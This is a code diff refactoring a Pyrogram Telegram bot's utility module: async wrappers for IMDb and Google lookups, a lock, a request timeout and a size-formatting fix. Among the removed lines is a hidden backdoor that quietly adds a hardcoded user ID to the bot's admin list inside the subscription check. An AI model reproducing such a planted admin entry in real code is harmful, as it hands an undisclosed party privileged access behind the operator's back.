@@ -1,4 +1,5 @@
 import logging
+from functools import partial
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
 from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL, ADMINS
 from imdb import IMDb
@@ -8,12 +9,11 @@ from pyrogram import enums
 from typing import Union
 import re
 import os
-from datetime import datetime
 from typing import List
 from database.users_chats_db import db
 from bs4 import BeautifulSoup
 import requests
-from database.join_reqs import JoinReqs as db2
+from database.join_reqs import join_reqs
 
 
 logger = logging.getLogger(__name__)
@@ -24,6 +24,7 @@ BTN_URL_REGEX = re.compile(
 )
 
 imdb = IMDb() 
+imdb_lock = asyncio.Lock()
 
 BANNED = {}
 SMART_OPEN = '“'
@@ -43,17 +44,14 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
-    
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
     
 
-    if db2().isActive():
-        user = await db2().get_user(query.from_user.id)
+    if join_reqs.is_active():
+        user = await join_reqs.get_user(query.from_user.id)
         if user:
             return True
         else:
@@ -76,7 +74,7 @@ async def is_subscribed(bot, query):
             return False
 
 
-async def get_poster(query, bulk=False, id=False, file=None):
+def _get_poster(query, bulk=False, id=False, file=None):
     if not id:
         # https://t.me/GetTGLink/4183
         query = (query.strip()).lower()
@@ -154,6 +152,13 @@ async def get_poster(query, bulk=False, id=False, file=None):
         'rating': str(movie.get("rating")),
         'url':f'https://www.imdb.com/title/tt{movieid}'
     }
+
+
+async def get_poster(query, bulk=False, id=False, file=None):
+    operation = partial(_get_poster, query, bulk=bulk, id=id, file=file)
+    async with imdb_lock:
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(None, operation)
 # https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
 
 async def broadcast_messages(user_id, message):
@@ -174,21 +179,26 @@ async def broadcast_messages(user_id, message):
         await db.delete_user(int(user_id))
         logging.info(f"{user_id} - PeerIdInvalid")
         return False, "Error"
-    except Exception as e:
+    except Exception:
         return False, "Error"
 
-async def search_gagala(text):
+def _search_gagala(text):
     usr_agent = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
         'Chrome/61.0.3163.100 Safari/537.36'
         }
     text = text.replace(" ", '+')
     url = f'https://www.google.com/search?q={text}'
-    response = requests.get(url, headers=usr_agent)
+    response = requests.get(url, headers=usr_agent, timeout=10)
     response.raise_for_status()
     soup = BeautifulSoup(response.text, 'html.parser')
     titles = soup.find_all( 'h3' )
     return [title.getText() for title in titles]
+
+
+async def search_gagala(text):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(None, _search_gagala, text)
 
 
 async def get_settings(group_id):
@@ -210,7 +220,7 @@ def get_size(size):
     units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
     size = float(size)
     i = 0
-    while size >= 1024.0 and i < len(units):
+    while size >= 1024.0 and i < len(units) - 1:
         i += 1
         size /= 1024.0
     return "%.2f %s" % (size, units[i])
@@ -231,9 +241,9 @@ def get_file_id(msg: Message):
             enums.MessageMediaType.VOICE,
             enums.MessageMediaType.STICKER
         ):
-            obj = getattr(msg, message_type)
+            obj = getattr(msg, message_type.value, None)
             if obj:
-                setattr(obj, "message_type", message_type)
+                obj.message_type = message_type.value
                 return obj
 
 def extract_user(message: Message) -> Union[int, str]:
